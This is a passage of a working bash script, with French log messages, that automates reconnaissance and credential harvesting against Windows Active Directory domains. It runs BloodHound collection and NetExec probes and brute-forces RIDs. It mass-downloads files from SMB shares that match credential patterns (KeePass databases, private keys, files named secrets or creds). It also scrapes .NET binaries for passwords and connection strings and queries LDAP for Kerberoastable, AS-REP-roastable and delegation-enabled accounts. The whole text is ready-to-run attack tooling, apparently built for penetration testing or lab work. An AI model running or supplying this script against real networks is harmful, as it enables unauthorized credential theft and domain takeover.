  rm -f "$bh_dir/${bh_prefix}"_*.json "$bh_dir/${bh_prefix}"_*.zip 2>/dev/null || true
  (
    cd "$bh_dir" || exit 1
    run_bloodhound_cmd "$bh_timeout" "${bh_cmd[@]}"
  ) 2>&1 | tee bloodhound_collect.txt | mask_pass >/dev/null || true
  bh_zip="$(find "$bh_dir" -maxdepth 1 -type f -name "${bh_prefix}_*.zip" -size +0c | head -1 || true)"
  bh_json_count="$(find "$bh_dir" -maxdepth 1 -type f -name "${bh_prefix}_*.json" -size +0c | wc -l | tr -d ' ' || echo 0)"
  if grep -qiE 'LDAPSocketOpenError|gc_connect|GC LDAP server|Connection timed out' bloodhound_collect.txt 2>/dev/null; then
    bh_gc_issue=1
  fi

  if [ -z "$bh_zip" ] && [ "${bh_json_count:-0}" -lt 3 ] && [ "$bh_gc_issue" = "1" ]; then
    local bh_prefix_fallback="${bh_prefix}_dconly"
    local bh_cmd_fallback=()
    log "Le GC LDAP semble poser problème -> nouvelle tentative BloodHound en mode DCOnly"
    rm -f "$bh_dir/${bh_prefix_fallback}"_*.json "$bh_dir/${bh_prefix_fallback}"_*.zip 2>/dev/null || true
    if [ -n "${AD_PASS:-}" ]; then
      bh_cmd_fallback=(bloodhound-python
        -u "$user_upn" -p "$AD_PASS" --auth-method ntlm
        -d "$DOMAIN" -c DCOnly -ns "$TARGET" -dc "$DC" --dns-tcp --disable-autogc --dns-timeout 5 --zip -op "$bh_prefix_fallback")
    elif [ "$GETTGT_OK" = "1" ] && [ -f "attack_checks/${U}.ccache" ]; then
      bh_cmd_fallback=(env "KRB5CCNAME=$(pwd)/attack_checks/${U}.ccache" bloodhound-python
        -u "$user_upn" -k -no-pass --auth-method kerberos
        -d "$DOMAIN" -c DCOnly -ns "$TARGET" -dc "$DC" --dns-tcp --disable-autogc --dns-timeout 5 --zip -op "$bh_prefix_fallback")
    else
      log "Aucun mot de passe ni ccache utilisable pour le fallback BloodHound"
      bh_cmd_fallback=()
    fi
    if [ "${#bh_cmd_fallback[@]}" -gt 0 ]; then
      log "CMD fallback: ${bh_cmd_fallback[*]}"
      (
        cd "$bh_dir" || exit 1
        run_bloodhound_cmd "$bh_timeout" "${bh_cmd_fallback[@]}"
      ) 2>&1 | tee -a bloodhound_collect.txt | mask_pass >/dev/null || true
      bh_zip="$(find "$bh_dir" -maxdepth 1 -type f \( -name "${bh_prefix}_*.zip" -o -name "${bh_prefix_fallback}_*.zip" \) -size +0c | head -1 || true)"
      bh_json_count="$(find "$bh_dir" -maxdepth 1 -type f \( -name "${bh_prefix}_*.json" -o -name "${bh_prefix_fallback}_*.json" \) -size +0c | wc -l | tr -d ' ' || echo 0)"
      if [ -n "$bh_zip" ] || [ "${bh_json_count:-0}" -ge 3 ]; then
        bh_prefix="$bh_prefix_fallback"
        bh_mode_label="DCOnly"
      fi
    fi
  fi

  if [ -z "$bh_zip" ] && [ "${bh_json_count:-0}" -lt 3 ] && [ "$bh_gc_issue" = "1" ]; then
    local bh_prefix_gcmin="${bh_prefix}_gcmin"
    local bh_cmd_gcmin=()
    log "Le fallback DCOnly dépend encore du GC sur cette version de bloodhound-python -> tentative minimale sans memberships"
    rm -f "$bh_dir/${bh_prefix_gcmin}"_*.json "$bh_dir/${bh_prefix_gcmin}"_*.zip 2>/dev/null || true
    if [ -n "${AD_PASS:-}" ]; then
      bh_cmd_gcmin=(bloodhound-python
        -u "$user_upn" -p "$AD_PASS" --auth-method ntlm
        -d "$DOMAIN" -c Trusts,Container -ns "$TARGET" -dc "$DC" --dns-tcp --disable-autogc --dns-timeout 5 --zip -op "$bh_prefix_gcmin")
    elif [ "$GETTGT_OK" = "1" ] && [ -f "attack_checks/${U}.ccache" ]; then
      bh_cmd_gcmin=(env "KRB5CCNAME=$(pwd)/attack_checks/${U}.ccache" bloodhound-python
        -u "$user_upn" -k -no-pass --auth-method kerberos
        -d "$DOMAIN" -c Trusts,Container -ns "$TARGET" -dc "$DC" --dns-tcp --disable-autogc --dns-timeout 5 --zip -op "$bh_prefix_gcmin")
    fi
    if [ "${#bh_cmd_gcmin[@]}" -gt 0 ]; then
      log "CMD fallback minimal: ${bh_cmd_gcmin[*]}"
      (
        cd "$bh_dir" || exit 1
        run_bloodhound_cmd "$bh_timeout" "${bh_cmd_gcmin[@]}"
      ) 2>&1 | tee -a bloodhound_collect.txt | mask_pass >/dev/null || true
      bh_zip="$(find "$bh_dir" -maxdepth 1 -type f \( -name "${bh_prefix}_*.zip" -o -name "${bh_prefix_gcmin}_*.zip" \) -size +0c | head -1 || true)"
      bh_json_count="$(find "$bh_dir" -maxdepth 1 -type f \( -name "${bh_prefix}_*.json" -o -name "${bh_prefix_gcmin}_*.json" \) -size +0c | wc -l | tr -d ' ' || echo 0)"
      if [ -n "$bh_zip" ] || [ "${bh_json_count:-0}" -ge 1 ]; then
        bh_prefix="$bh_prefix_gcmin"
        bh_mode_label="Trusts,Container"
        bh_min_json_success=1
      fi
    fi
  fi

  if [ -n "$bh_zip" ] && have unzip; then
    log "Décompression du zip BloodHound dans ${bh_dir}/"
    unzip -o "$bh_zip" -d "$bh_dir" >/dev/null 2>&1 || true
    bh_json_count="$(find "$bh_dir" -maxdepth 1 -type f -name "${bh_prefix}_*.json" -size +0c | wc -l | tr -d ' ' || echo 0)"
  fi

  append_bloodhound_summary "bloodhound_collect.txt" "$bh_dir" "$bh_prefix"

  if [ -n "$bh_zip" ]; then
    BLOODHOUND_OK=1
    good "Collecte BloodHound terminée (zip généré, mode=${bh_mode_label})."
  elif [ "${bh_json_count:-0}" -ge "$bh_min_json_success" ]; then
    BLOODHOUND_OK=1
    good "Collecte BloodHound terminée (${bh_json_count} JSON générés, mode=${bh_mode_label})."
  else
    find "$bh_dir" -maxdepth 1 -type f \( -name "${bh_prefix}_*.json" -o -name "${bh_prefix}_*.zip" \) -size 0c -delete 2>/dev/null || true
    if [ "$bh_gc_issue" = "1" ]; then
      bad "La collecte BloodHound a échoué car le port GC LDAP (3268/3269) semble inaccessible. Vérifie bloodhound_collect.txt"
    else
      bad "La collecte BloodHound a peut-être échoué. Vérifie bloodhound_collect.txt"
    fi
  fi
}

# ============================================================
# Sondage dynamique NXC (modules + options)
# ============================================================
nxc_probe_run() {
  local name="$1"
  local cmd="$2"
  local out="attack_checks/nxc_probe/${name}.txt"

  log "NXC PROBE: $cmd"
  bash -c "$cmd" 2>&1 | tee "$out" | mask_pass >/dev/null || true

  if grep -qiE "unrecognized arguments|unknown option|invalid choice|usage:|Traceback|ERROR|connection refused|timed out|No route to host|NT_STATUS_LOGON_FAILURE|STATUS_LOGON_FAILURE|access denied" "$out"; then
    echo "[FAIL] $name :: $cmd" >> attack_checks/nxc_probe/summary_fail.txt
    return
  fi

  if grep -qiE "(\+|valid|authenticated|pwned)" "$out"; then
    good "NXC OK : $name (auth/connectivité semble correcte)"
  fi

  if grep -qiE "(\+|valid|authenticated|pwned|Signing|SMBv1|Shares|Groups|Users|OS:|Domain:|Hostname:|MSSQL|LDAP|WinRM)" "$out"; then
    echo "[OK]   $name :: $cmd" >> attack_checks/nxc_probe/summary_ok.txt
  else
    echo "[EMPTY] $name :: $cmd" >> attack_checks/nxc_probe/summary_fail.txt
  fi
}

nxc_autoprobe_dynamic() {
  : > attack_checks/nxc_probe/summary_ok.txt
  : > attack_checks/nxc_probe/summary_fail.txt

  if [ "$NXC_HAS" != "1" ]; then
    log "Pas de nxc -> autoprobe ignoré"
    return
  fi
  if [ "$AUTH_MODE" != "1" ]; then
    log "Pas d'identifiants -> autoprobe nxc ignoré"
    return
  fi

  section "Phase X : autoprobe dynamique NXC"
  good "Sondes d'énumération SAFE uniquement (pas d'exec / shell automation)."

  local U="$AD_USER_BEST"

  local smb_base="nxc smb $TARGET -u \"${U}\" -p \"${AD_PASS}\" -d \"${DOMAIN}\""
  local winrm_base="nxc winrm $TARGET -u \"${U}\" -p \"${AD_PASS}\" -d \"${DOMAIN}\""
  local mssql_base="nxc mssql $TARGET -u \"${U}\" -p \"${AD_PASS}\""
  local ldap_base="nxc ldap $TARGET -u \"${U}\" -p \"${AD_PASS}\" -d \"${DOMAIN}\""

  # SMB probes
  if echo "$NXC_MODULES" | grep -qw "smb"; then
    nxc_probe_run "smb_basic" "$smb_base"

    if nxc_has_opt "$NXC_SMB_HELP" "--shares"; then
      nxc_probe_run "smb_shares" "$smb_base --shares"
      if nxc_has_opt "$NXC_SMB_HELP" "--verbose"; then
        nxc_probe_run "smb_shares_verbose" "$smb_base --shares --verbose"
      fi
    fi
    if nxc_has_opt "$NXC_SMB_HELP" "--groups"; then
      nxc_probe_run "smb_groups" "$smb_base --groups"
    fi
    if nxc_has_opt "$NXC_SMB_HELP" "--users"; then
      nxc_probe_run "smb_users" "$smb_base --users"
    fi
    if nxc_has_opt "$NXC_SMB_HELP" "--pass-pol"; then
      nxc_probe_run "smb_passpol" "$smb_base --pass-pol"
    fi
    if nxc_has_opt "$NXC_SMB_HELP" "--sessions"; then
      nxc_probe_run "smb_sessions" "$smb_base --sessions"
    fi
    if nxc_has_opt "$NXC_SMB_HELP" "--local-auth"; then
      nxc_probe_run "smb_local_auth" "$smb_base --local-auth"
    fi

    if [ "$RID_BRUTE" = "1" ] && nxc_has_opt "$NXC_SMB_HELP" "--rid-brute"; then
      nxc_probe_run "smb_rid_brute" "$smb_base --rid-brute"
    fi
  fi

  # WinRM probes
  if [ "$WINRM_CHECK" = "1" ] && echo "$NXC_MODULES" | grep -qw "winrm"; then
    nxc_probe_run "winrm_basic" "$winrm_base"
  fi

  # MSSQL probes
  if echo "$NXC_MODULES" | grep -qw "mssql"; then
    nxc_probe_run "mssql_basic" "$mssql_base -p \"${AD_PASS}\" -u \"${U}\""
    if nxc_has_opt "$NXC_MSSQL_HELP" "-d" || nxc_has_opt "$NXC_MSSQL_HELP" "--domain"; then
      nxc_probe_run "mssql_with_domain" "$mssql_base -u \"${U}\" -p \"${AD_PASS}\" -d \"${DOMAIN}\""
    fi
  fi

  # LDAP probes
  if echo "$NXC_MODULES" | grep -qw "ldap"; then
    nxc_probe_run "ldap_basic" "$ldap_base"
  fi

  echo
  good "Autoprobe NXC terminé -> attack_checks/nxc_probe/"
  echo "---- OK ----"
  sed 's/^/  /' attack_checks/nxc_probe/summary_ok.txt 2>/dev/null || true
  echo "---- ÉCHEC/VIDE ----"
  sed 's/^/  /' attack_checks/nxc_probe/summary_fail.txt 2>/dev/null || true

  if [ -s attack_checks/nxc_probe/summary_ok.txt ]; then
    good "Au moins une sonde nxc a réussi (connectivité/auth probablement OK)."
  else
    bad "Aucune sonde nxc n'a réussi (service indisponible, mauvais identifiants ou restrictions)."
  fi
}

nxc_autoprobe_anonymous() {
  if [ "$ANON_NXC_PROBE" != "1" ]; then
    return
  fi
  if [ "$NXC_HAS" != "1" ]; then
    return
  fi
  if ! echo "$NXC_MODULES" | grep -qw "smb"; then
    return
  fi
  if [ "$AUTH_MODE" = "1" ]; then
    return
  fi

  : > attack_checks/nxc_probe/summary_ok_anon.txt
  : > attack_checks/nxc_probe/summary_fail_anon.txt

  section "Phase X0 : autoprobe NXC anonyme"
  local smb_anon_base="nxc smb $TARGET"

  nxc_probe_run "anon_smb_basic" "$smb_anon_base"
  if nxc_has_opt "$NXC_SMB_HELP" "--shares"; then
    nxc_probe_run "anon_smb_shares" "$smb_anon_base --shares"
  fi
  if nxc_has_opt "$NXC_SMB_HELP" "--users"; then
    nxc_probe_run "anon_smb_users" "$smb_anon_base --users"
  fi
  if nxc_has_opt "$NXC_SMB_HELP" "--groups"; then
    nxc_probe_run "anon_smb_groups" "$smb_anon_base --groups"
  fi
  if nxc_has_opt "$NXC_SMB_HELP" "--pass-pol"; then
    nxc_probe_run "anon_smb_passpol" "$smb_anon_base --pass-pol"
  fi
  if [ "$ANON_RID_BRUTE" = "1" ] && nxc_has_opt "$NXC_SMB_HELP" "--rid-brute"; then
    nxc_probe_run "anon_smb_rid_brute" "$smb_anon_base --rid-brute"
  fi
}

# ============================================================
# Énumération SMB + partages + loot
# ============================================================
smb_enum_and_loot() {
  section "Phase 1 : énumération SMB + loot"

  if have nxc; then
    nxc smb "$TARGET" 2>&1 | tee smb_enum.txt || true
  else
    crackmapexec smb "$TARGET" 2>&1 | tee smb_enum.txt || true
  fi

  smbclient -L "//$TARGET/" -N 2>&1 | tee -a smb_enum.txt || true

  local U="$AD_USER_BEST"
  local U_SHORT
  U_SHORT="$(normalize_user_short "$U")"
  if [ "$SMB_AUTH_OK" = "1" ]; then
    log "Liste des partages SMB authentifiée (peut révéler davantage)"
    smbclient -L "//$TARGET/" -U "${U_SHORT}%${AD_PASS}" -W "$DOMAIN" 2>&1 | tee smb_enum_auth.txt | mask_pass || true
  fi

  local SHARE_SRC="smb_enum.txt"
  [ -s "smb_enum_auth.txt" ] && SHARE_SRC="smb_enum_auth.txt"

  awk '
    BEGIN{in_tbl=0}
    /Sharename[[:space:]]+Type/{in_tbl=1; next}
    in_tbl && /^[[:space:]]*-+[[:space:]]*-+/{next}
    in_tbl && /^[[:space:]]*$/{next}
    in_tbl && /^[[:space:]]*[A-Za-z0-9._$-]+[[:space:]]+(Disk|IPC)/{ print $1 }
  ' "$SHARE_SRC" | sort -u > smb_shares/shares_all.txt || true

  log "Partages découverts :"
  cat smb_shares/shares_all.txt 2>/dev/null | sed 's/^/  - /' || true

  : > smb_shares/shares_target.txt
  for s in SYSVOL NETLOGON; do
    grep -qx "$s" smb_shares/shares_all.txt 2>/dev/null && echo "$s" >> smb_shares/shares_target.txt || true
  done
  grep -vE '^(ADMIN\$|C\$|IPC\$|print\$)$' smb_shares/shares_all.txt 2>/dev/null \
    | grep -viE '^(SYSVOL|NETLOGON)$' \
    | head -n "$MAX_SHARES" >> smb_shares/shares_target.txt || true
  sort -u smb_shares/shares_target.txt -o smb_shares/shares_target.txt || true

  log "Partages sélectionnés pour le loot :"
  cat smb_shares/shares_target.txt 2>/dev/null | sed 's/^/  - /' || true

  local SMBCLIENT_ARGS="-N"
  if [ "$SMB_AUTH_OK" = "1" ]; then
    SMBCLIENT_ARGS="-U ${U_SHORT}%${AD_PASS} -W ${DOMAIN}"
  fi

  if [ ! -s smb_shares/shares_target.txt ]; then
    log "Aucun partage listé. Test direct des noms de partages courants..."
    local probe_share outp
    for probe_share in SYSVOL NETLOGON Users Public Data; do
      outp="smb_shares/inventory/probe_${probe_share}.txt"
      smbclient "//$TARGET/$probe_share" $SMBCLIENT_ARGS -c "ls" 2>&1 | tee "$outp" >/dev/null || true
      if ! grep -qiE "NT_STATUS_(BAD_NETWORK_NAME|RESOURCE_NAME_NOT_FOUND|ACCESS_DENIED|LOGON_FAILURE|USER_SESSION_DELETED)" "$outp"; then
        echo "$probe_share" >> smb_shares/shares_target.txt
      fi
    done
    sort -u smb_shares/shares_target.txt -o smb_shares/shares_target.txt || true
  fi

  if [ ! -s smb_shares/shares_target.txt ]; then
    cat > smb_shares/inventory/NO_SHARES_FOUND.txt <<EOF
Aucun partage SMB accessible trouvé avec le mode actuel.
Causes probables :
- Session nulle autorisée pour la bannière, mais listing des partages bloqué.
- Des identifiants AD valides sont nécessaires pour lister/lire les partages.
- La politique du service/hôte coupe la session anonyme (STATUS_USER_SESSION_DELETED).
EOF
    log "Aucun partage accessible trouvé. Voir smb_shares/inventory/NO_SHARES_FOUND.txt"
  fi

  section "Phase 1b : inventaire des partages + téléchargements"
  LOOT_MASKS=(
    "*.exe" "*.dll" "*.pdb"
    "*.config" "*.conf" "*.ini" "*.json" "*.yml" "*.yaml" "*.xml" "*.txt" "*.log"
    "*.ps1" "*.bat" "*.cmd" "*.vbs"
    "*.kdbx" "*.rdp" "*.ppk" "*.pem" "*.key"
    "*.db" "*.sqlite" "*.db3"
    "*.bak" "*.old" "*.backup" "*.sav"
    "*.zip" "*.7z" "*.rar" "*.tar" "*.gz"
  )

  while IFS= read -r share; do
    [ -z "${share:-}" ] && continue
    log "Loot du partage : $share ($([ "$SMB_AUTH_OK" = "1" ] && echo AUTH || echo ANON))"
    mkdir -p "downloads/$share"

    smbclient "//$TARGET/$share" $SMBCLIENT_ARGS -c "recurse ON; ls" 2>&1 \
      | tee "smb_shares/inventory/${share}_recurse_ls.txt" >/dev/null || true

    (
      cd "downloads/$share" || exit 0
      for mask in "${LOOT_MASKS[@]}"; do
        smbclient "//$TARGET/$share" $SMBCLIENT_ARGS -c "recurse ON; prompt OFF; mask \"$mask\"; mget *" \
          >/dev/null 2>&1 || true
      done
      for name in config configuration settings secrets secret creds credentials backup db database; do
        smbclient "//$TARGET/$share" $SMBCLIENT_ARGS -c "recurse ON; prompt OFF; mask \"$name\"; mget *" \
          >/dev/null 2>&1 || true
      done
    )
  done < smb_shares/shares_target.txt
}

# ============================================================
# Extraction de secrets .NET
# ============================================================
dotnet_secrets() {
  section "Phase 1c : extraction de secrets binaires .NET"
  JUICY_RE='Server=|Database=|Initial Catalog=|Data Source=|User[[:space:]]*Id=|UID=|Password=|PWD=|pass(word)?=|apikey|api[_-]?key|token|secret|bearer|connectionStrings|connectionString'

  : > dotnet_juicy.txt
  : > dotnet_il_hits.txt

  BIN_LIST="binaries.list"
  find downloads -type f \( -iname "*.exe" -o -iname "*.dll" -o -iname "*.pdb" \) -print | sort > "$BIN_LIST" || true
  good "Binaires candidats : $(wc -l < "$BIN_LIST" 2>/dev/null || echo 0)"

  scan_one_bin() {
    local f="$1"
    echo "===== $f =====" >> dotnet_juicy.txt
    if have monodis; then monodis --strings "$f" 2>/dev/null | grep -Eai "$JUICY_RE" | sed 's/\r$//' >> dotnet_juicy.txt || true; fi
    if have strings; then strings -n 6 "$f" 2>/dev/null | grep -Eai "$JUICY_RE" | sed 's/\r$//' >> dotnet_juicy.txt || true; fi
    echo >> dotnet_juicy.txt

    if have monodis; then
      local sz
      sz="$(stat -c%s "$f" 2>/dev/null || echo 99999999)"
      if echo "$f" | grep -qiE '\.exe$' && [ "$sz" -le 15000000 ]; then
        local tmp
        tmp="il_$(echo -n "$f" | tr '/$ ' '___' | tr -cd 'A-Za-z0-9._-').txt"
        monodis "$f" 2>/dev/null > "$tmp" || true
        grep -nEai "$JUICY_RE" "$tmp" 2>/dev/null | sed "s|^|$f: |" >> dotnet_il_hits.txt || true
        rm -f "$tmp" || true
      fi
    fi
  }

  if [ -s "$BIN_LIST" ]; then
    while IFS= read -r f; do
      [ -z "${f:-}" ] && continue
      scan_one_bin "$f"
    done < "$BIN_LIST"
  fi

  local HITS_COUNT IL_HITS_COUNT
  HITS_COUNT="$(grep -Eai "$JUICY_RE" dotnet_juicy.txt 2>/dev/null | wc -l || echo 0)"
  IL_HITS_COUNT="$(wc -l < dotnet_il_hits.txt 2>/dev/null || echo 0)"
  good "dotnet_juicy.txt hits: ${HITS_COUNT}"
  good "dotnet_il_hits.txt lines: ${IL_HITS_COUNT}"
}

# ============================================================
# Énumération LDAP (anonyme + authentifiée)
# ============================================================
ldap_prepare_base() {
  local LDAP_OPTS=(-o nettimeout=5 -l 20)
  ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -s base namingcontexts 2>&1 | tee ldap_base.txt || true

  BASE_DN="$(awk -F': ' 'BEGIN{IGNORECASE=1} /^namingcontexts: DC=/{print $2; exit}' ldap_base.txt || true)"
  if [ -z "${BASE_DN:-}" ]; then
    BASE_DN="$(echo "$DOMAIN" | awk -F'.' '{for(i=1;i<=NF;i++){printf "DC=%s%s",$i,(i<NF?",":"")}}')"
    log "Impossible de parser namingcontexts, repli BASE_DN=${BASE_DN}"
  else
    good "BASE_DN détecté=${BASE_DN}"
  fi
  LDAP_BASE_DN="$BASE_DN"
}

ldap_bound_user_short() {
  local u="${AD_USER_BEST:-$AD_USER_RAW}"
  normalize_user_short "$u"
}

phase_ldap_anon_base() {
  section "Phase 2 : sonde LDAP anonyme"
  local LDAP_OPTS=(-o nettimeout=5 -l 15)
  ldap_prepare_base

  LDAP_PROBE="$(ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -b "$BASE_DN" -s base "(objectClass=*)" dn 2>&1 || true)"
  echo "$LDAP_PROBE" | tee ldap_probe.txt >/dev/null

  if echo "$LDAP_PROBE" | grep -qiE "successful bind must be completed|Operations error"; then
    log "LDAP nécessite un bind -> dump anonyme subtree/utilisateurs ignoré"
    : > ldap_full.txt
    : > users_ldap.txt
  else
    ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -b "$BASE_DN" -s base "(objectClass=*)" dn namingContexts defaultNamingContext 2>&1 \
      | tee ldap_full.txt || true
  fi
}

phase_ldap_users_auth() {
  section "Phase 2a : utilisateurs LDAP authentifiés"
  local LDAP_OPTS=(-o nettimeout=5 -l 20)
  ldap_prepare_base
  if ! ensure_ldap_auth; then
    log "LDAP auth non confirmée -> utilisateurs LDAP ignorés"
    return
  fi
  local U_SHORT
  U_SHORT="$(ldap_bound_user_short)"
  ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -D "${U_SHORT}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
    "(objectClass=user)" sAMAccountName memberOf pwdLastSet accountExpires userAccountControl 2>/dev/null \
    | tee ldap_users_auth.txt | mask_pass
  awk -F': ' '/^sAMAccountName: /{print $2}' ldap_users_auth.txt | tr -d '\r' | sort -u > users_ldap_auth.txt || true
  good "Utilisateurs LDAP authentifiés trouvés : $(wc -l < users_ldap_auth.txt 2>/dev/null || echo 0)"
}

phase_ldap_kerberoastable() {
  section "Phase 2b : comptes Kerberoastable (LDAP)"
  local LDAP_OPTS=(-o nettimeout=5 -l 20)
  ldap_prepare_base
  if ! ensure_ldap_auth; then
    log "LDAP auth non confirmée -> Kerberoastable LDAP ignoré"
    return
  fi
  local U_SHORT
  U_SHORT="$(ldap_bound_user_short)"
  ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -D "${U_SHORT}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
    "(&(objectClass=user)(servicePrincipalName=*)(!samAccountName=krbtgt))" sAMAccountName servicePrincipalName 2>/dev/null \
    | tee ldap_kerberoastable.txt | mask_pass || true
  grep -c "^sAMAccountName:" ldap_kerberoastable.txt 2>/dev/null | xargs -I{} good "Comptes Kerberoastable trouvés (LDAP) : {}" || true
}

phase_ldap_asrep_candidates() {
  section "Phase 2c : comptes ASREPRoastable (LDAP)"
  local LDAP_OPTS=(-o nettimeout=5 -l 20)
  ldap_prepare_base
  if ! ensure_ldap_auth; then
    log "LDAP auth non confirmée -> ASREPRoastable LDAP ignoré"
    return
  fi
  local U_SHORT
  U_SHORT="$(ldap_bound_user_short)"
  ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -D "${U_SHORT}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
    "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName 2>/dev/null \
    | awk -F': ' '/^sAMAccountName: /{print $2}' | tr -d '\r' | sort -u \
    | tee ldap_asrep_candidates.txt | mask_pass || true
  if [ -s ldap_asrep_candidates.txt ]; then
    good "Comptes ASREPRoastable trouvés (LDAP) : $(wc -l < ldap_asrep_candidates.txt)"
    cat ldap_asrep_candidates.txt | sed 's/^/  >> /'
  fi
}

ldap_enum() {
  section "Phase 2 : énumération LDAP"
  local LDAP_OPTS=(-o nettimeout=5 -l 30)
  ldap_prepare_base

  LDAP_PROBE="$(ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -b "$BASE_DN" -s base "(objectClass=*)" dn 2>&1 || true)"
  echo "$LDAP_PROBE" | tee ldap_probe.txt >/dev/null

  if echo "$LDAP_PROBE" | grep -qiE "successful bind must be completed|Operations error"; then
    log "LDAP nécessite un bind -> dump anonyme subtree/utilisateurs ignoré"
    : > ldap_full.txt
    : > users_ldap.txt
  else
    ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -b "$BASE_DN" 2>&1 | tee ldap_full.txt || true
    ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -b "$BASE_DN" "(objectClass=user)" sAMAccountName 2>/dev/null \
      | awk -F': ' '/^sAMAccountName: /{print $2}' | sed 's/\r$//' | sort -u > users_ldap.txt || true
    good "Utilisateurs LDAP anonymes trouvés : $(wc -l < users_ldap.txt 2>/dev/null || echo 0)"
  fi

  local U_LDAP
  U_LDAP="$(ldap_bound_user_short)"
  if [ "$LDAP_AUTH_OK" = "1" ]; then
    log "Requêtes LDAP authentifiées (utilisateurs/groupes/postes/politique de mot de passe)"
    ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" "(objectClass=user)" sAMAccountName memberOf pwdLastSet accountExpires userAccountControl 2>/dev/null \
      | tee ldap_users_auth.txt | mask_pass
    awk -F': ' '/^sAMAccountName: /{print $2}' ldap_users_auth.txt | tr -d '\r' | sort -u > users_ldap_auth.txt || true
    good "Utilisateurs LDAP authentifiés trouvés : $(wc -l < users_ldap_auth.txt 2>/dev/null || echo 0)"

    ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" "(objectClass=group)" cn member 2>/dev/null \
      | tee ldap_groups_auth.txt | mask_pass

    ldapsearch "${LDAP_OPTS[@]}" -LLL -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" "(objectClass=computer)" dNSHostName operatingSystem 2>/dev/null \
      | tee ldap_computers_auth.txt | mask_pass

    log "Recherche d'objets pertinents pour la délégation..."
    ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
      "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dNSHostName userAccountControl 2>/dev/null \
      | tee ldap_unconstrained_delegation.txt | mask_pass || true
    ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
      "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo 2>/dev/null \
      | tee ldap_constrained_delegation.txt | mask_pass || true
    ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
      "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity 2>/dev/null \
      | tee ldap_rbcd_candidates.txt | mask_pass || true

    # Password policy via LDAP
    log "Interrogation de la politique de mot de passe LDAP..."
    ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
      "(objectClass=domainDNS)" minPwdLength lockoutThreshold lockoutDuration pwdHistoryLength maxPwdAge 2>/dev/null \
      | tee ldap_passpol.txt | mask_pass || true

    # ASREPRoastable users (no pre-auth required)
    log "Recherche de comptes ASREPRoastable (DONT_REQ_PREAUTH)..."
    ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
      "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName 2>/dev/null \
      | awk -F': ' '/^sAMAccountName: /{print $2}' | tr -d '\r' | sort -u \
      | tee ldap_asrep_candidates.txt | mask_pass || true
    if [ -s ldap_asrep_candidates.txt ]; then
      good "Comptes ASREPRoastable trouvés (LDAP) : $(wc -l < ldap_asrep_candidates.txt)"
      cat ldap_asrep_candidates.txt | sed 's/^/  >> /'
    fi

    # Kerberoastable users (SPNs set)
    log "Recherche de comptes Kerberoastable (servicePrincipalName)..."
    ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
      "(&(objectClass=user)(servicePrincipalName=*)(!samAccountName=krbtgt))" sAMAccountName servicePrincipalName 2>/dev/null \
      | tee ldap_kerberoastable.txt | mask_pass || true
    grep -c "^sAMAccountName:" ldap_kerberoastable.txt 2>/dev/null | xargs -I{} good "Comptes Kerberoastable trouvés (LDAP) : {}" || true

    # AdminCount=1 (privileged accounts)
    log "Recherche de comptes privilégiés (adminCount=1)..."
    ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
      "(&(objectClass=user)(adminCount=1))" sAMAccountName memberOf 2>/dev/null \
      | awk -F': ' '/^sAMAccountName: /{print $2}' | tr -d '\r' | sort -u \
      | tee ldap_admincount.txt | mask_pass || true
    if [ -s ldap_admincount.txt ]; then
      good "Comptes AdminCount=1 : $(wc -l < ldap_admincount.txt)"
      cat ldap_admincount.txt | sed 's/^/  >> /'
    fi

    # Accounts with no expiry (flag suspicious)
    log "Recherche de comptes dont le mot de passe n'expire jamais..."
    ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -b "$BASE_DN" \
      "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" sAMAccountName 2>/dev/null \
      | awk -F': ' '/^sAMAccountName: /{print $2}' | tr -d '\r' | sort -u \
      | tee ldap_pwdneverexpires.txt | mask_pass || true
    if [ -s ldap_pwdneverexpires.txt ]; then
      good "Comptes avec PASSWD_NEVER_EXPIRES : $(wc -l < ldap_pwdneverexpires.txt)"
    fi
  fi
}

phase_ldapdomaindump() {
